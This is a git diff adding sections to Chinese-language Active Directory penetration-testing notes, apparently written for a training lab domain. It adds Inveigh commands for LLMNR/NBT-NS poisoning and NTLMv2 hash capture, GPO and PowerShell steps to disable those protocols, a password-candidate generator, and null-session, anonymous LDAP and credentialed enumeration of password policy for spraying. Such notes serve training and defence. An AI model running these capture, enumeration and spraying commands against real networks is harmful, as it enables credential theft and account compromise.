@@ -1146,6 +1146,8 @@ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_
 
 这种攻击可能会提供可以离线破解的低权限或管理级别密码哈希，甚至是明文凭据。哈希值有时也可用于执行 SMB 中继攻击，以使用管理权限向域中的一个或多个主机进行身份验证，而无需离线破解密码哈希值。
 
+### 6.2.1 Linux
+
 1.工具:responder
 
 确保以下端口可用
@@ -1165,6 +1167,119 @@ responder -I ens224 -A
 ```shell-session
 hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
 ```
+
+### 6.2.2 Windows
+
+```
+Import-Module .\Inveigh.ps1 
+(Get-Command Invoke-Inveigh).Parameters
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+```
+
+```
+.\Inveigh.exe
+GET NTLMV2USERNAMES
+GET NTLMV2UNIQUE
+```
+
+### 6.2.3 remediation:
+
+转到“计算机配置 > 管理模板 --> 网络 --> DNS 客户端”并启用“关闭多播名称解析”来禁用组策略中的 LLMNR。
+
+![image-20250603185446399](pictures/image-20250603185446399.png)
+
+通过打开 `“控制面板 `”下的 `“网络和共享中心 `”，单击 `“更改适配器设置 `”，右键单击适配器以查看其属性，选择 `Internet Protocol Version 4 (TCP/IPv4)` 并单击 `“属性 `”按钮，然后单击 `“高级 `”并选择“`WINS`”选项卡，最后选择 `“禁用 TCP/IP 上的 NetBIOS`”。
+
+![image-20250603185509307](pictures/image-20250603185509307.png)
+
+禁用 NBT-NS
+
+在计算机配置 --> Windows 设置 --> 脚本（启动/关闭）--> 启动下创建一个 PowerShell 脚本，如下所示：
+
+```powershell
+$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
+Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
+```
+
+在本地组策略编辑器中，我们需要双击 `“启动 `”，选择 `“PowerShell 脚本”` 选项卡，然后选择“对于此 GPO，请按以下顺序运行脚本”，然后单击 `Run Windows PowerShell scripts first` `“添加 `”并选择脚本。要进行这些更改，我们必须重新启动目标系统或重新启动网络适配器。
+
+![image-20250603185555530](pictures/image-20250603185555530.png)
+
+要将其推送到域中的所有主机，我们可以在域控制器上使用组策略`管理`创建一个 GPO，并将脚本托管在脚本文件夹中的 SYSVOL 共享上，然后通过其 UNC 路径调用它，例如：
+
+```
+\\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts
+```
+
+最后,监视注册表项 `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient` 中 `EnableMulticast` DWORD 值的更改。值为 `0` 表示 LLMNR 已禁用。
+
+## 6.3 密码喷射
+
+生成只包含字母和数字的密码，1,679,616 个可能的组合。
+
+```bash
+for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}
+    do echo $x;
+done
+```
+
+**Note**：虽然密码喷洒对渗透测试人员或红队成员很有用，但粗心使用可能会造成相当大的伤害，例如锁定数百个生产帐户
+
+### 6.3.1　获取密码策略
+
+方式１：借助有效的域凭证
+
+```shell-session
+crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol　
+```
+
+方式２：Linux　从SMB　NULL会话
+
+```
+### 使用rpcclient ###
+rpcclient -U "" -N 172.16.5.5
+querydominfo
+getdompwinfo
+
+### 使用enum4linux ###
+enum4linux -P 172.16.5.5
+enum4linux-ng -P 172.16.5.5 -oA ilfreight
+cat ilfreight.json
+```
+
+​                Windows ipc$ NULL会话
+
+```
+net use \\DC01\ipc$ "" /u:""
+```
+
+方式３：Linux LDAP 匿名
+
+```
+### 使用 ldapsearch ###
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength 新版中用-H代替了-h
+```
+
+​              Windows 已登录 net 枚举
+
+```
+net accounts
+```
+
+**Note:**锁定阈值为 5 意味着我们可以尝试每 31 分钟喷洒 2-3 次（为安全起见），而不会有锁定任何帐户的风险。如果帐户被锁定，它将在 30 分钟后自动解锁（无需管理员的手动干预），但我们应该不惜一切代价避免锁定`任何`帐户。
+
+​              Windows 已登录 PowerView 枚举
+
+```
+import-module .\PowerView.ps1
+Get-DomainPolicy
+```
+
+
+
+
+
+
 
 # 七、Metasploit
 
